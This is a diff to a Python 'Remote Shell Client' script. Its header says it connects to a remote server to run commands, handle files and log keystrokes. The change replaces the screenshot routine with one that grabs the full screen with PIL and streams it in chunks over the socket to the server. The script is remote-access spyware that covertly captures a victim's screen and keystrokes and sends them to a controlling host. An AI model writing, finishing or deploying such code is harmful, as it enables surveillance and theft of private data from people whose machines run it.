@@ -1,17 +1,16 @@
 #!/usr/bin/python
 # Remote Shell Client
-
 # Description:
 # This script serves as the client-side counterpart to the Remote Shell server. It connects to the server
 # and allows the execution of commands, file operations, and includes a keylogger feature.
-
+import io
 import socket
 import threading
 import time
 import json
 import subprocess
 import os
-import mss
+from PIL import ImageGrab
 from pynput import keyboard
 
 
@@ -109,18 +108,28 @@ class RemoteControl:
             self.server_socket.settimeout(None)
 
     def screen_shot(self):
-        time.sleep(0.25)
-        with mss.mss() as sct:
-            # Capture a screenshot
-            screenshot = sct.shot(output='screenshot.png')
-            # Read and send the screenshot as chunks
-            with open(screenshot, "rb") as image_file:
-                while True:
-                    chunk = image_file.read(1024)
-                    if not chunk:
-                        break
-                    self.server_socket.send(chunk)
-                self.server_socket.send(b"END_OF_IMAGE")
+        # Capture a screenshot
+        screenshot = ImageGrab.grab()
+
+        # Create an in-memory byte stream
+        image_stream = io.BytesIO()
+
+        screenshot.save(image_stream, format='PNG')
+
+        # Get the bytes data from the stream
+        image_data = image_stream.getvalue()
+
+        # Define the chunk size (adjust as needed)
+        chunk_size = 1024
+        # Send the image data in chunks
+        total_sent = 0
+        while total_sent < len(image_data):
+            chunk = image_data[total_sent:total_sent + chunk_size]  # calculates the ending index for slicing
+            self.server_socket.send(chunk)
+            total_sent += len(chunk)
+
+        # Send a marker to indicate the end of the image
+        self.server_socket.send(b"END_OF_IMAGE")
 
     def main_loop(self):
         while True:
